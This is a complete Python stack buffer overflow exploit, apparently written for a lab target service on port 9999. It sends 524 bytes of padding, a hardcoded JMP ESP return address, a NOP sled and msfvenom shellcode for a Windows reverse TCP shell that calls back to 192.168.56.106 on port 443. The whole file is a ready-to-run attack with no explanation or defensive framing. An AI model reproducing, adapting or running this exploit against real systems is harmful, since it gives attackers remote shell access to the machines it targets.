#! /usr/bin/python3

import socket

IP = '192.168.56.1'
PORT = 9999

offset = 524
overflow = b'A' * offset
retn = b'\xf3\x12\x17\x31' #jmp esp 0x311712F3
padding = b'\x90' * 16

#badchars x00
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.106 LPORT=443 -b "\x00" -f python

shellcode =  b'\xb8\x42\x65\x36\x39\xda\xc7\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x52\x31\x46\x12\x03\x46\x12\x83\xac\x99\xd4\xcc\xcc\x8a\x9b\x2f\x2c\x4b\xfc\xa6\xc9\x7a\x3c\xdc\x9a\x2d\x8c\x96\xce\xc1\x67\xfa\xfa\x52\x05\xd3\x0d\xd2\xa0\x05\x20\xe3\x99\x76\x23\x67\xe0\xaa\x83\x56\x2b\xbf\xc2\x9f\x56\x32\x96\x48\x1c\xe1\x06\xfc\x68\x3a\xad\x4e\x7c\x3a\x52\x06\x7f\x6b\xc5\x1c\x26\xab\xe4\xf1\x52\xe2\xfe\x16\x5e\xbc\x75\xec\x14\x3f\x5f\x3c\xd4\xec\x9e\xf0\x27\xec\xe7\x37\xd8\x9b\x11\x44\x65\x9c\xe6\x36\xb1\x29\xfc\x91\x32\x89\xd8\x20\x96\x4c\xab\x2f\x53\x1a\xf3\x33\x62\xcf\x88\x48\xef\xee\x5e\xd9\xab\xd4\x7a\x81\x68\x74\xdb\x6f\xde\x89\x3b\xd0\xbf\x2f\x30\xfd\xd4\x5d\x1b\x6a\x18\x6c\xa3\x6a\x36\xe7\xd0\x58\x99\x53\x7e\xd1\x52\x7a\x79\x16\x49\x3a\x15\xe9\x72\x3b\x3c\x2e\x26\x6b\x56\x87\x47\xe0\xa6\x28\x92\xa7\xf6\x86\x4d\x08\xa6\x66\x3e\xe0\xac\x68\x61\x10\xcf\xa2\x0a\xbb\x2a\x25\xf5\x94\x0c\xdf\x9d\xe6\x6c\x1e\xe5\x6e\x8a\x4a\x09\x27\x05\xe3\xb0\x62\xdd\x92\x3d\xb9\x98\x95\xb6\x4e\x5d\x5b\x3f\x3a\x4d\x0c\xcf\x71\x2f\x9b\xd0\xaf\x47\x47\x42\x34\x97\x0e\x7f\xe3\xc0\x47\xb1\xfa\x84\x75\xe8\x54\xba\x87\x6c\x9e\x7e\x5c\x4d\x21\x7f\x11\xe9\x05\x6f\xef\xf2\x01\xdb\xbf\xa4\xdf\xb5\x79\x1f\xae\x6f\xd0\xcc\x78\xe7\xa5\x3e\xbb\x71\xaa\x6a\x4d\x9d\x1b\xc3\x08\xa2\x94\x83\x9c\xdb\xc8\x33\x62\x36\x49\x43\x29\x1a\xf8\xcc\xf4\xcf\xb8\x90\x06\x3a\xfe\xac\x84\xce\x7f\x4b\x94\xbb\x7a\x17\x12\x50\xf7\x08\xf7\x56\xa4\x29\xd2'
payload = overflow + retn + padding + shellcode
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(3)
        s.connect((IP, PORT))
        print('Sending evil buffer...')
        s.send(payload)
        print('Done!')
except:
    print('Could not connect to remote host')